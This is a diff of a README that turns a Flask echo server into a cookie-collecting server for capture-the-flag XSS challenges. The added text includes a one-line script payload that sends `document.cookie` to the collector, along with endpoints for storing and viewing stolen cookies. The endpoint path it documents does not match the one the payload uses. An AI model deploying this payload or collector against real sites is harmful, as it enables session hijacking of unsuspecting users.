@@ -1,77 +1,26 @@
 # flask-echo-server
 
-A simple echo server built with flask.
+A simple echo server built with flask for CTF
 
-#### Install
-```
-↪ python3 setup.py install
-```
+## echo
+> Removed options; Just minimal echo server left.
 
-#### Usage
-```
-↪ flask-echo -h
-Usage: flask-echo [options]
+![](screenshots/echo.png)
 
-Options:
-  -h, --help     show this help message and exit
-  --port=PORT    port to run server on - default 5000
-  --host=HOST    host to bind server on - default 127.0.0.1
-  --auth=AUTH    basic authentication credentials, should be passed in like
-                 "username:password"
-  -v, --verbose  increased verbosity - outputs response to console
-  --debug        enable debug mode in flask
+## cookies
+> Farm and view cookies fast!
+
+### farm cookies
+Sending a request to `/c?c=COOKIE` adds `COOKIE` to `cookie.txt` in the same directory with `echo.py`.
+
+The following script sends all the accessible cookies in the current document to the server(Can be used in XSS challenges).
+```HTML
+<script>location.href = "/cookie?c=" + document.cookie;</script>
 ```
 
-#### Example
-```
-↪ flask-echo &
-* Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
-↪ http localhost:5000
-127.0.0.1 - - [17/Mar/2015 22:11:20] "GET / HTTP/1.1" 200 -
-HTTP/1.0 200 OK
-Content-Length: 529
-Content-Type: application/json
-Date: Wed, 18 Mar 2015 03:11:20 GMT
-Server: Werkzeug/0.10.1 Python/3.4.0
+### view collected cookies
+Open a browser and go to `/v` and view collected cookies.
 
-{
-    "args": {},
-    "base_url": "http://localhost:5000/",
-    "cookies": {},
-    "data": "",
-    "form": {},
-    "headers": {
-        "Accept": "*/*",
-        "Accept-Encoding": "gzip, deflate, compress",
-        "Content-Length": "",
-        "Content-Type": "",
-        "Host": "localhost:5000",
-        "User-Agent": "HTTPie/0.8.0"
-    },
-    "host": "localhost:5000",
-    "method": "GET",
-    "path": "/",
-    "script_root": "",
-    "status": 200,
-    "success": true,
-    "time": 1426648280.7245362,
-    "url": "http://localhost:5000/",
-    "url_root": "http://localhost:5000/"
-}
-```
+![](screenshots/cookie.png)
 
-#### Basic Authentication
-You can enable basic auth by passing credentials with the command line argument --auth
-```
-↪ flask-echo --auth username:password
-```
-
-#### Request Arguments
-Some additional arguments can be passed to change the response behavior.
-
-##### status
-```
-↪ http 'localhost:5000?status=401'
-HTTP/1.0 401 UNAUTHORIZED
-...
-```
+The screenshot above is the result after I sent `C00K1E-M0n$T3R!!!` three times.
